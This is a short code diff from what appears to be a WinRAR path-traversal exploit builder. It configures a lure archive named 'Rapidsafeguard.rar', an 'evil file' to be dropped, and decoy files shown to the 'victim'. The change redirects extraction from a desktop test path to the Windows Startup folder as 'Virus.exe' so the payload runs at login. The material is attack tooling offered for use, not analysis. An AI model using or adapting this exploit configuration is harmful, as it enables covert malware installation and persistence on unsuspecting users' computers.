@@ -10,8 +10,8 @@ rar_filename = "Rapidsafeguard.rar"
 # The evil file you want to run
 evil_filename = "calc.exe"
 # The decompression path you want, such shown below
-#target_filename = r"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.exe"
-target_filename=r"C:\C:C:../Users\GTUGIC\Desktop\Payload\Virus.exe"
+target_filename = "C:\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.exe"
+#target_filename="C:\Users\GTUGIC\Desktop\Payload\Virus.exe"
 # Other files to be displayed when the victim opens the winrar
 # filename_list=[]
 filename_list = ["hello.txt", "world.txt"]
